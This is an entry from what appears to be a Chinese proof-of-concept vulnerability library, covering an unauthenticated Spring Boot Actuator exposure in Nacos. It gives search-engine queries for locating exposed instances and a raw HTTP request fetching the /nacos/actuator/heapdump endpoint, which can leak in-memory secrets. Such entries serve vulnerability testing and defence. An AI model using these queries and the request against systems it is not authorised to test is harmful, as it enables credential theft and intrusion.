---
fofa: "app.name="
source: "wy876 漏洞文库"
---

# Nacos存在Spring boot Actuator未授权漏洞

# 一、漏洞简介
<font style="color:rgb(63, 63, 63);">Nacos 是阿里巴巴推出来的一个新开源项目，是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。致力于帮助发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，可以快速实现动态服务发现、服务配置、服务元数据及流量管理。Nacos存在Spring boot Actuator未授权漏洞</font>

# <font style="color:rgb(51, 51, 51);">二、影响版本</font>
+ <font style="color:rgba(0, 0, 0, 0.9);">Nacos </font>

# <font style="color:rgba(0, 0, 0, 0.9);">三、资产测绘</font>
+ hunter`app.name="Nacos"`
+ 特征


# 四、漏洞复现
```plain
/nacos/actuator/
```


```plain
HEAD /nacos/actuator/heapdump HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/utanzrai31cospcx>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
